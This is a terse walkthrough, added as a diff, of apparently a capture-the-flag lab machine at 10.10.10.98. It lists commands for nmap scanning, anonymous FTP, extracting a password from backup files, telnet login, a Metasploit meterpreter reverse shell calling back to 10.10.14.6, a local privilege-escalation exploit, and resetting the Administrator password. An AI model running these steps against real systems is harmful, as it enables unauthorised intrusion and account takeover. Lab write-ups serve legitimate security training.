@@ -1,0 +1,56 @@
+Penetrating Methodologies:
+
+Network scanning (Nmap)
+Logging into FTP using Anonymous Login.
+Using strings to read contents of the .mdb file.
+Unzipping Zip file using 7z.
+Using readpst to read the contents of the .pst file.
+Finding Login Credentials
+Logging into Telnet.
+Finding the first flag user.txt
+Using web delivery module to create PowerShell code.
+Getting Meterpreter.
+Using exploit suggester of Metasploit.
+Getting Root Access.
+Changing the Administrator password using net user.
+Reading Our Final flag root.txt
+
+
+
+  1.) nmap -p- -A 10.10.10.98
+  2.) 21/tcp open   ftp
+  3.) Log into FTP server
+  4.) ftp 10.10.10.98 
+  5.) strings backup.md | grep access
+  6.) access4u@security
+  7.) 7z x Access\ Control.zip
+  8.) readpst 'Access Control.pst'
+  9.) telnet 10.10.10.98
+  10.) dir
+  11.) cd Desktop
+  12.) type user.txt
+  13.) use exploit/multi/script/web_delivery
+  14.) set target 2
+  15.) set payload windows/x64/meterpreter/reverse_tcp
+  16.) set lhost 10.10.14.6
+  17.) exploit
+  18.) getuid
+  19.) getsystem
+  20.) sysinfo
+  21.) use exploit/windows/local/ms16_014_wmi_recv_notif 
+  22.) set lhost 10.10.14.6
+  23.) set session 1
+  24.) set lport 1234
+  25.) exploit
+  26.) whoami
+  27.) net user
+  28.) net user Administrator Ignite@123
+  29.) telnet 10.10.10.98
+  
+  
+  
+  
+  
+  
+  
+  
